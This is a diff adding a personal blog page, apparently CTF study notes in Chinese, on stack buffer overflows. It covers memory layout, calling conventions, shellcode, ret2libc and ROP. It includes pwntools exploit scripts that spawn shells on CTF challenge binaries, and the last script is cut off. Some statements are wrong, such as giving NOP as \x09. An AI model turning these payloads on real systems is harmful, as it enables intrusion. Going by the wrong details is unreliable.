@@ -1,0 +1,1293 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  
+  <title>PWN-缓冲区溢出原理 | huzai9527&#39;s personal blog</title>
+  
+  
+
+  
+  <link rel="alternate" href="/atom.xml" title="huzai9527's personal blog">
+  
+
+  <meta name="HandheldFriendly" content="True">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <!-- meta -->
+  
+
+  <!-- link -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.6.3/css/all.min.css">
+  
+
+  
+  <link rel="shortcut icon" type="image/x-icon" href="https://xaoxuu.com/assets/img/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="/style.css">
+  
+
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+
+  
+  
+</head>
+
+<body>
+  
+  
+  <header class="l_header material">
+  <div id="loading-bar-wrapper">
+    <div id="loading-bar" class="material"></div>
+  </div>
+
+	<div class="wrapper">
+		<div class="nav-main container container--flex">
+      <a class="logo flat-box" href="/">
+        
+          huzai9527's personal blog
+        
+      </a>
+			<div class="menu navgation">
+				<ul class="h-list">
+          
+  					
+  						<li>
+								<a class="nav flat-box" href="/" id="home">
+									<i class="fas fa-grin fa-fw"></i>&nbsp;近期文章
+								</a>
+							</li>
+      			
+  						<li>
+								<a class="nav flat-box" href="https://github.com/huzai9527?tab=repositories" rel="nofollow" id="https:github.comhuzai9527?tab=repositories">
+									<i class="fas fa-folder-open fa-fw"></i>&nbsp;项目
+								</a>
+							</li>
+      			
+  						<li>
+								<a class="nav flat-box" href="/archives/" rel="nofollow" id="archives">
+									<i class="fas fa-archive fa-fw"></i>&nbsp;归档
+								</a>
+							</li>
+      			
+  						<li>
+								<a class="nav flat-box" href="https://xaoxuu.com/wiki/volantis/" rel="nofollow" id="https:xaoxuu.comwikivolantis">
+									<i class="fas fa-info-circle fa-fw"></i>&nbsp;关于小站
+								</a>
+							</li>
+      			
+      		
+				</ul>
+			</div>
+
+			
+				<div class="m_search">
+					<form name="searchform" class="form u-search-form">
+						<input type="text" class="input u-search-input" placeholder="搜索">
+						<i class="icon fas fa-search fa-fw"></i>
+					</form>
+				</div>
+			
+			<ul class="switcher h-list">
+				
+					<li class="s-search"><a class="fas fa-search fa-fw" href="javascript:void(0)"></a></li>
+				
+				<li class="s-menu"><a class="fas fa-bars fa-fw" href="javascript:void(0)"></a></li>
+			</ul>
+		</div>
+
+		<div class="nav-sub container container--flex">
+			<a class="logo flat-box"></a>
+			<ul class="switcher h-list">
+				<li class="s-comment"><a class="flat-btn fas fa-comments fa-fw" href="javascript:void(0)"></a></li>
+        
+          <li class="s-toc"><a class="flat-btn fas fa-list fa-fw" href="javascript:void(0)"></a></li>
+        
+			</ul>
+		</div>
+	</div>
+</header>
+	<aside class="menu-phone">
+    <header>
+		<nav class="menu navgation">
+      <ul>
+        
+          
+            <li>
+							<a class="nav flat-box" href="/" id="home">
+								<i class="fas fa-clock fa-fw"></i>&nbsp;近期文章
+							</a>
+            </li>
+          
+            <li>
+							<a class="nav flat-box" href="/categories/" rel="nofollow" id="categories">
+								<i class="fas fa-archive fa-fw"></i>&nbsp;分类
+							</a>
+            </li>
+          
+            <li>
+							<a class="nav flat-box" href="/archives/" rel="nofollow" id="archives">
+								<i class="fas fa-archive fa-fw"></i>&nbsp;归档
+							</a>
+            </li>
+          
+            <li>
+							<a class="nav flat-box" href="/about/" rel="nofollow" id="about">
+								<i class="fas fa-info-circle fa-fw"></i>&nbsp;关于小站
+							</a>
+            </li>
+          
+       
+      </ul>
+		</nav>
+    </header>
+	</aside>
+<script>setLoadingBarProgress(40);</script>
+
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper'>
+      <div class="l_main">
+  
+
+  
+    <article id="post" class="post white-box article-type-post" itemscope="" itemprop="blogPost">
+      
+
+
+  <section class="meta">
+    
+    
+    <div class="meta" id="header-meta">
+      
+        
+  
+    <h1 class="title">
+      <a href="/2020/12/12/PWN-缓冲区溢出原理/">
+        PWN-缓冲区溢出原理
+      </a>
+    </h1>
+  
+
+
+      
+      <div class="new-meta-box">
+        
+          
+        
+          
+            
+  <div class="new-meta-item author">
+    <a href="http://yoursite.com" rel="nofollow">
+      
+        <i class="fas fa-user" aria-hidden="true"></i>
+      
+      <p>John Doe</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class="notlink">
+    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+    <p>2020-12-12</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            
+  
+    <div class="new-meta-item browse busuanzi">
+      <a class="notlink">
+        <i class="fas fa-eye" aria-hidden="true"></i>
+        <p>
+          <span id="busuanzi_value_page_pv">
+            <i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i>
+          </span>
+        </p>
+      </a>
+    </div>
+  
+
+
+          
+        
+          
+            
+
+          
+        
+      </div>
+      
+        <hr>
+      
+    </div>
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          <h2 id="三、缓冲区溢出原理"><a href="#三、缓冲区溢出原理" class="headerlink" title="三、缓冲区溢出原理"></a>三、缓冲区溢出原理</h2><h3 id="1-程序内存布局"><a href="#1-程序内存布局" class="headerlink" title="1.程序内存布局"></a>1.程序内存布局</h3><ul>
+<li><p>在程序运行的生命周期中,内存中比较重要的四部分数据是程序数据、堆、库数据、栈.此外内核空间也会映射到程序的内存中.</p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201116110155289.png" alt=""></p>
+</li>
+</ul>
+<ul>
+<li>程序数据(Proc)<ul>
+<li>代码段(Text seg)<pre><code>- 主要存放可执行文件的代码指令,是可执行程序在内存中的镜像,代码段一般是只读的
+</code></pre><ul>
+<li>数据段(Data seg)</li>
+<li>存放可执行文件中已经初始化的变量,包括静态分配的变量和全局变量</li>
+<li>BSS seg</li>
+<li>包含程序中未初始化的全局变量,在内存中bss 段全部置0</li>
+<li>堆(HEAP)</li>
+<li>存放进程运行过程中动态申请的内存段.进程调用malloc、alloca、new等函数来申请内存,利用free、delete函数释放内存.这部分大小不固定,以方便程序灵活使用内存.</li>
+<li>库数据(Memory Mapping)</li>
+<li>存放映射的系统库文件,其中比较重要的是libc库,很多的程序所使用的系统函数都会动态的连接到libc库中</li>
+<li>栈(Stack)</li>
+<li>栈存放程序临时创建的局部变量.包括函数内部的临时变量和调用函数时压入的参数.由于</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="1-函数调用栈"><a href="#1-函数调用栈" class="headerlink" title="1. 函数调用栈"></a>1. <a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">函数调用栈</a></h3><ul>
+<li><p>栈介绍</p>
+<ul>
+<li><p>栈内存一般根据函数栈来进行划分,不同函数栈之间是相互隔离的,从而能够实现有效的函数切换</p>
+</li>
+<li><p>函数栈上存储的信息一般包括</p>
+<ul>
+<li><p>临时变量 (canary)</p>
+</li>
+<li><p>函数的返回栈基址(bp)</p>
+</li>
+<li><p>函数的返回地址(ip)</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>函数栈的调用机制</p>
+<ul>
+<li><p>程序运行时,为了实现函数之间的相互隔离,需要在进入新的函数之前保存当前函数的状态</p>
+</li>
+<li><p>函数调用时,首先将参数压入栈,然后压入返回地址和栈底指针寄存器bp,其中压入返回地址是通过call实现的</p>
+</li>
+<li><p>函数结束时,将sp重新指向bp位置,并弹出bp和返回地址==ip==,通常bp是通过leave或者(pop ebp实现的)</p>
+</li>
+<li><p>函数栈示意图</p>
+<ul>
+<li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201116150123844.png" alt=""></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>- 在函数栈中bp存储了上一个函数栈的基址,ip存储的是调用处的下一条指令的位置.
+- 返回当前函数时,会从栈上弹出这两个值,从而恢复上一个函数的信息
+</code></pre><ul>
+<li><p>函数参数的传递</p>
+<ul>
+<li><p>函数调用协议</p>
+<ul>
+<li>_stdcall: wimdows API默认的函数调用协议<ul>
+<li>参数由由右向左入栈</li>
+<li>调用函数结束后由被调用函数来平衡栈</li>
+</ul>
+</li>
+<li>_cdecl: c++/c默认的函数调用协议<ul>
+<li>参数由右向左入栈</li>
+<li>函数调用结束后由函数调用者来平衡栈</li>
+</ul>
+</li>
+<li>_fastcall:适用于对性能要求较高的场合<ul>
+<li>从左开始将不大于4字节的参数放入CPU的ecx和edx寄存器,其余参数从右向左入栈</li>
+<li>函数调用结束后,由被调用者来平衡栈</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>对于X86程序</p>
+<ul>
+<li><p>普通函数传参:参数基本都压在栈上(也有寄存器传参的情况)</p>
+</li>
+<li><p>syscall传参: eax对应系统调用号,ebx,ecx,edx,esi,edi,ebp分别对应前六个参数,多余的参数压在栈上</p>
+</li>
+<li><p>==对于x86程序而言,参数传递是通过栈来实现的,在调用完以后,需要清除栈中参数,所以一般函数调用完之后需要用形如“pop;pop *;,,,,;ret;”的 gadget来调整.因为函数调用时返回地址会压入栈中,既汇编中的“call func”指令等同于“pop ret_addr;jump func”,因此在执行jmp func的时候,ret_addr已经压入栈中了==</p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201116160723459.png" alt=""></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>- 将ret_addr改成”pop*；ret“指令的gadget，用来弹出后续的args，即成为ROP的形式，这也是ROP的原理
+
+  ![](CTF-pwn.assets/image-20201116160738116.png)
+</code></pre><ul>
+<li><p>对于X64程序</p>
+<ul>
+<li><p>普通函数传参:先使用rdi,rsi,rdx,r8,r9寄存器作为函数参数的前六个参数,多余的参数依次压在栈上</p>
+</li>
+<li><p>syscall传参:rax对应系统调用号,传参规则和普通函数一样</p>
+</li>
+<li><p>对于X64的程序来说，一般情况下，函数的参数较少，通常用寄存器来传递参数，所以在进入函数之前，因该先将寄存器设置好</p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201116161212714.png" alt=""></p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>函数运行时内存中的一段连续的区域,用来保存函数运行时的状态信息,包括参数与局部变量</p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027195726522.png" alt=""></p>
+</li>
+</ul>
+<ul>
+<li><h5 id="涉及的寄存器"><a href="#涉及的寄存器" class="headerlink" title="涉及的寄存器"></a>涉及的寄存器</h5><ul>
+<li><p>栈寄存器</p>
+<ul>
+<li>esp: 用来存储函数调用栈的栈顶地址,在压栈和退栈时发生变化</li>
+<li>ebp:用来存储当前函数状态的基地址,在函数运行时不变,可以用来索引函数参数或局部变量的位置</li>
+</ul>
+</li>
+<li><p>特殊寄存器</p>
+<ul>
+<li><p>eip:用来存储即将执行的程序指令的地址,cpu按照eip的存储内容读取指令并执行,eip随之指向下一条指令,如此反复</p>
+</li>
+<li><p>Eflags:标识位寄存器</p>
+</li>
+<li><p>cs(code segment):储存代码段的地址</p>
+</li>
+<li><p>ds(data segment):储存数据段的地址</p>
+</li>
+<li><p>ss(stack segment):储存函数调用栈的地址</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>一般寄存器</p>
+<ul>
+<li>eax(Accumulate):累加寄存器,用于进行算数运算,返回函数结果</li>
+<li>ebx(Base):基址寄存器,在内存寻址时(比如数组运算),存放基地址</li>
+<li>ecx(Count):计数寄存器,用以在循环中计数</li>
+<li>edx(Data):数据寄存器,通常配合eax存放运算结果等数据</li>
+</ul>
+</li>
+<li><p>索引寄存器</p>
+<ul>
+<li>esi(Souce Index):指向要处理数据的地址</li>
+<li>edi(Destination Index): 指向存放数据结果的地址</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>涉及的汇编指令</p>
+<ul>
+<li>MOV DST,SRC; (数据传输指令) 将src中的数据传输到dst中</li>
+<li>PUSH SRC; (压入堆栈指令)将SRC压入栈</li>
+<li>POP DST;(弹出堆栈指令) 弹出堆栈指令,将栈顶的数据弹出并保存至DST</li>
+<li>LEA REG,MEM; (取地址指令)将MEM的地址存在REG中</li>
+<li>ADD/SUB DST,SRC;(加减指令)</li>
+<li>CALL PTR;(调用指令 )将当前的eip压入栈顶,并将PTR存入eip</li>
+<li>RET ;(返回指令)将栈顶数据弹出至eip</li>
+</ul>
+</li>
+<li><p>调用函数时,栈的变化(如何抛弃被调用函数的状态)</p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201145127.png" alt=""></p>
+</li>
+</ul>
+<p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201543440.png" alt=""></p>
+<p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201451467.png" alt=""></p>
+<p>  <img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201645337.png" alt=""></p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201738540.png" alt=""></p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027201912962.png" alt=""></p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027202008746.png" alt=""></p>
+<h3 id="2-技术清单"><a href="#2-技术清单" class="headerlink" title="2.技术清单"></a>2.技术清单</h3><ul>
+<li><p>覆盖缓冲区的具体用途</p>
+<ul>
+<li><p>覆盖当前栈中函数的返回地址（当前函数或者之前的函数），获取控制流</p>
+</li>
+<li><p>覆盖栈中所存储的临时变量</p>
+</li>
+<li><p>覆盖栈底寄存器bp（之前的函数）</p>
+<ul>
+<li><p>覆盖bp实现栈转移</p>
+<ul>
+<li><p>这种情况主要针对“leave；ret”指令；该指令等价于“mov sp,bp;pop bp;ret”</p>
+<p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201116162151945.png" alt=""></p>
+</li>
+</ul>
+</li>
+<li><p>覆盖bp，实现参数索引改变</p>
+<ul>
+<li>一般来说，很多临时变量的索引，都是根据相对于bp的偏移量来进行的，如果bp发生了变化，那么后续的很多参数也会发生变化</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>关注敏感函数</p>
+<ul>
+<li>background<ul>
+<li>控制指令执行最关键的寄存器就是eip,因此我们的==<strong>目标</strong>是让eip载入攻击指令的地址==</li>
+<li>如何让eip指向攻击指令,</li>
+<li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027202257764.png" alt=""></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>list<ul>
+<li>修改返回地址,使其指向溢出数据中的一段指令==(shellcode)==</li>
+<li>修改返回地址,使其指向内存中已有的某个函数==(return2libc==)</li>
+<li>修改返回地址,使其指向内存中已有的某段指令==(ROP)==</li>
+<li>修改某个被调用的函数的地址,让其指向另一个函数==(hijack GOT)==</li>
+</ul>
+</li>
+</ul>
+<h4 id="1-Shellcode-关闭地址随机化以及有可执行权限"><a href="#1-Shellcode-关闭地址随机化以及有可执行权限" class="headerlink" title="1.Shellcode(关闭地址随机化以及有可执行权限)"></a>1.Shellcode(关闭地址随机化以及有可执行权限)</h4><ul>
+<li>payload = padding1 + address of shellcode + padding2 + shellcode</li>
+<li><p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027211319900.png" alt=""></p>
+</li>
+<li><p>padding1 中的数据随便填充(⚠️如果是字符串输入,避免\x00,可能会被截断),==长度应该刚好覆盖函数的基地址==</p>
+<ul>
+<li>==问题一==:padding1因该多长?<ul>
+<li>可以通过调试工具(GDB)查看汇编代码来确定这个值==一般是lea指令+4==</li>
+<li>也可以通过程序不断增加输入长度来试探(如果返回地址被无效地址如”AAA“覆盖)程序会报错</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>address of shellcode 是后面shellcode处的起始处的地址,==用来覆盖返回地址==<ul>
+<li>==问题二:==shellcode 的起始地址是多少?<ul>
+<li>可以通过调试工具查看返回值的地址(ebp中的内容+4, 32位机)</li>
+<li>但是调试里的地址可能和正常运行时不一样,此时就可以通过在padding2中填充若干长度的==“\x09”==,此机器码对应的指令是NOP(No Operation),既告诉cpu啥也不用做,然后跳到下一指令,有了NOP的填充,只要返回地址能够命中这一段中的任一位置,都可以跳转到shellcode的起始处</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>padding2可以随意填充,长度任意.</li>
+<li>shellcode因该是16进制机器码的格式</li>
+<li><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201027213551447.png" alt=""></li>
+</ul>
+<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29955</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_n_5'</span>)</span><br><span class="line"><span class="comment">#这句话非常重要,因为设置arch决定了👇shell的汇编结果,不同arch下得到的结果是不一样的</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成64位linuxshellcode</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">0x20</span> + <span class="string">b'a'</span>*<span class="number">8</span> + p64(<span class="number">0x601080</span>)<span class="comment">#栈溢出ret到shellcode执行</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"name\n"</span>,shellcode)</span><br><span class="line">sh.sendlineafter(<span class="string">"me?\n"</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="2-return2libc–指向内存中的函数-操作系统关闭ASLR"><a href="#2-return2libc–指向内存中的函数-操作系统关闭ASLR" class="headerlink" title="2.return2libc–指向内存中的函数(操作系统关闭ASLR)"></a>2.return2libc–指向内存中的函数(操作系统关闭ASLR)</h4><ul>
+<li><p>获取libc中的system函数的地址,使用gdb,给main函数打上断点,然后使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p system</span><br></pre></td></tr></table></figure>
+<p>该方法可以获取任意libc函数的地址</p>
+</li>
+<li><p>设置system函数返回后的地址,以及为system函数构造我们预定的参数</p>
+</li>
+<li><p>由于我们使用system的函数地址替换了原本的ip寄存器,强制执行了system函数.破坏了原程序栈桢分配和释放策略,所以后续的操作必须基于这个被破坏的栈桢结构来实现</p>
+</li>
+<li><p>例如下面的payload中的padding2的操作应该是pop ip,也就是system函数调用完成后需要返回的地址</p>
+<ul>
+<li>为什么呢?<ul>
+<li>因为在正常情况下,函数是通过call进行调用的,因此在进入system前,call指令已经通过push ip将返回地址push到函数调用栈中,所以在正常情况下ret指令pop到ip的数据就是call指令push到栈中的数据,也就是说两者是成对出现的</li>
+<li>但是!!!!由于我们是直接通过覆盖ip的地址从而跳转到system函数,并没有经过call指令的调用,也就是并没有push ip的操作,但是system函数却照常执行了ret指令的pop ip的操作.</li>
+<li>因此,ret 指令pop到ip中的到底是哪一处的数据呢,答案就是padding2中的数据,也就是我们自己设定的system函数的返回地址</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>知道了system部分的payload,那么如何获得system的地址以及bin/sh的地址呢?</p>
+<ul>
+<li><p>可以通过puts与gets函数,gets造成溢出,puts泄漏libc中的system以及/bin/sh的地址</p>
+<ul>
+<li><p>bin在so文件中的地址</p>
+<ul>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -t x libc.so | grep bin</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>可执行的system(“/bin/sh”)在so文件中的地址</p>
+<ul>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget  libc.so</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>由于我们可以控制栈,根据rop的思想,我们需要找到的就是pop rdi;ret 前半段用于给第一个参数rdi赋值,后半段用于跳到其他代码片段</p>
+<ul>
+<li><p>如何找到可以赋值的参数呢?</p>
+<ul>
+<li><p>可以通过,ROPgadget,这里的值通常是固定的0x400833</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary file_name --only <span class="string">"pop|ret"</span> | grep rdi</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>因此我们可以构造payload泄漏出puts函数的真实地址</li>
+</ul>
+<ul>
+<li><p>有了真实地址,我们还需要知道程序使用的libc,算出libc的基址</p>
+<ul>
+<li><p>这里可以使用<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LibcSearcher</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">"fgets"</span>, <span class="number">0X7ff39014bd90</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>知道了程序使用的libc,以及puts函数的真实地址,我们就可算出libc的基址,再通过基址加偏移就能得到函数的真实地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc_base = <span class="number">0X7ff39014bd90</span> - obj.dump(<span class="string">"fgets"</span>)</span><br><span class="line">obj.dump(<span class="string">"system"</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">"str_bin_sh"</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line"><span class="comment">#system的真实地址</span></span><br><span class="line">system_addr =libc_base +  obj.dump(<span class="string">"system"</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>这里有可能会遇到,匹配不到libc的错误,可以通过<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a>,添加libc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./get  <span class="comment"># List categories</span></span><br><span class="line">./get ubuntu debian  <span class="comment"># Download Ubuntu's and Debian's libc, old default behavior</span></span><br><span class="line">./get all  <span class="comment"># Download all categories. Can take a while!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#或者添加自身的libc</span></span><br><span class="line">./add /usr/lib/libc-2.21.so</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h5 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h5><ul>
+<li>64位</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',25805)</span></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line">elf = ELF(<span class="string">'ciscn_2019_c_1'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">p.recvuntil(<span class="string">'!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'\x00'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">print(<span class="string">"payload=====&gt;"</span>+str(payload))</span><br><span class="line">p.recvuntil(<span class="string">'ed\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'\n\n'</span>)</span><br><span class="line">puts_real_addr = u64(p.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">print(<span class="string">'puts real addr ====&gt;'</span>+str(hex(puts_real_addr)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_real_addr)</span><br><span class="line">libc_base = puts_real_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">print(<span class="string">'libc_base====&gt;'</span>+str(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"system ====&gt;"</span>+str(hex(system)))</span><br><span class="line">print(<span class="string">"bin_sh ====&gt;"</span>+str(hex(bin_sh)))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'\x00'</span>*<span class="number">0x58</span> +p64(ret)+ p64(pop_rdi) + p64(bin_sh) + p64(system) </span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>32位</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28001</span>)</span><br><span class="line"><span class="comment">#r=process('./pwn')</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">'read'</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line"><span 